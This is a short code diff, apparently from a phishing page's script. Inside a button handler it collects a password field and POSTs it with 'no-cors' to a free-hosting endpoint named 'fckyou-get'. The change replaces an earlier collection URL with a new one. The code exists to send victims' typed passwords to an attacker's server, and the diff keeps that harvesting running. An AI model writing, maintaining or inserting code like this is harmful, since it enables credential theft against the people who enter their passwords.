@@ -12,7 +12,7 @@ if (btn){
         data.append("password", password.value);
 
 
-        const response = fetch("https://fckyou.42web.io/index/get.php", {
+        const response = fetch("https://fckyou-get.000webhostapp.com/get.php", {
             mode: 'no-cors',
             method: "POST",
             body: data
